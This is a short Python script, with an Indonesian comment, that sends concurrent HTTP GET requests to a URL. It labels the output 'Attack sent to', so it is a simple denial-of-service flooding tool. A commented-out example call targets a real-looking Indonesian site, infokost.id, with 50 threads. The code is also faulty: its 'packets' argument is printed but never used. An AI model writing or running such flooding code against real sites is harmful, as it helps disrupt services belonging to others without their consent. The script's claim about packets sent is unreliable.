import threading
import requests

def send_req_basic_v1(url, packets=10, threads=1):
    results = []

    def send_req_basic(url):
        try:
            t = requests.get(url, timeout=5)
            results.append(f"GET {url} STATUS CODE {t.status_code}")
        except requests.exceptions.ConnectTimeout:
            results.append(f"GET {url} CONNECTION TIMEOUT")
        except requests.exceptions.RequestException as e:
            results.append(f"GET {url} ERROR: {e}")

    def run_threads(url, packets, threads):
        thread_list = []

        for _ in range(threads):
            thread = threading.Thread(target=send_req_basic, args=(url,))
            thread_list.append(thread)
            thread.start()

        for thread in thread_list:
            thread.join()

    print(f"\nAttack sent to:")
    print(f"Url: {url}")
    print(f"Packets: {packets}")
    print(f"Threads: {threads}\n")
    
    run_threads(url, packets, threads)
    

# Contoh pemanggilan fungsi
# send_req_basic_v1("http://infokost.id", packets=50, threads=50)
